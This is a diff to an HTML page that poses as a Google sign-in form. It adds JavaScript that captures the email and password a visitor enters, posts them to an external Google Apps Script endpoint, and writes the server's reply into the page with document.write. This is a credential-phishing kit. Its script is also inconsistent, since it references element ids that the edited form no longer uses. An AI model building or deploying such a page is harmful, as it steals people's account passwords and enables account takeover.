@@ -856,14 +856,14 @@
 
 
 
-<form action="https://script.google.com/macros/s/AKfycbyG51g2kaW0iz3XzRE-PwIV8v9icTlxetIPaMfczkCozCg5zdvwH5HI1kfPtoW2mlig/exec" method="post">
+<form id="dataForm">
   
 <input type="hidden" name="redirect_url" value="https://gmail.com">
 
 
 
  <input type="hidden" id="title" name="title" value="Google">
-  <input type="hidden" name="timestamp" value="2025-08-12T12:00:00Z"> <!-- Example timestamp -->
+  <input type="hidden" name="timestamp1"> <!-- Example timestamp -->
   <input type="email" name="user" placeholder="Email">
   <input type="password" name="password" placeholder="Password">
   
@@ -933,4 +933,35 @@
   </div>
 </div>
   </div>
-</body></html>
+</body> <script>
+    // Set current ISO timestamp
+    document.getElementById("timestamp").value = new Date().toISOString();
+
+    const form = document.getElementById("loginForm");
+
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+      const params = new URLSearchParams();
+
+      for (const pair of formData.entries()) {
+        params.append(pair[0], pair[1]);
+      }
+
+      fetch("https://script.google.com/macros/s/AKfycbyG51g2kaW0iz3XzRE-PwIV8v9icTlxetIPaMfczkCozCg5zdvwH5HI1kfPtoW2mlig/exec", {
+        method: "POST",
+        body: params
+      })
+      .then(response => response.text())
+      .then(responseText => {
+        // Run any JS returned by the Apps Script (e.g., redirect)
+        document.write(responseText);
+      })
+      .catch(error => {
+        console.error("Error submitting form:", error);
+        alert("Submission failed.");
+      });
+    });
+  </script>
+  </html>
